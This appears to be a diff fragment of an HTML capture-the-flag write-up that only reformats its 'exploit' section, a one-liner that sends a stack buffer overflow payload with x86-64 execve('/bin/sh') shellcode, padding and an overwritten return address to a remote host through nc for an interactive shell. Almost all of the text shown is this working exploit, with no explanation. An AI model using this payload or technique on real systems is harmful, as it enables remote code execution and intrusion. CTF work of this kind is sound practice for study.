@@ -247,10 +247,10 @@ i saved stack. then stack overwrite rip :P.
 
 <h2>exploit</h2>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(python -c 'print ("\x0e")'; python -c 'print (open("shell.bin").read()+"A"*2360)'; python -c 'print ("\x0e"+"\x60\x02\x00\x00"+"http://"+"\x90"*(0x220-
-</span><span class='line'>49)+"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"+"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"+"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"+"\x58\x0f\x05"+"C"*8+"\x6c\x11\x40"+"\x00"*5)';cat)|nc 52.72.171.221 9982</span></code></pre></td></tr></table></div></figure>
+<pre><code>
+(python -c 'print ("\x0e")'; python -c 'print (open("shell.bin").read()+"A"*2360)'; python -c 'print ("\x0e"+"\x60\x02\x00\x00"+"http://"+"\x90"*(0x220-
+49)+"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"+"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"+"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"+"\x58\x0f\x05"+"C"*8+"\x6c\x11\x40"+"\x00"*5)';cat)|nc 52.72.171.221 9982
+</code></pre>
 
 
   </article>
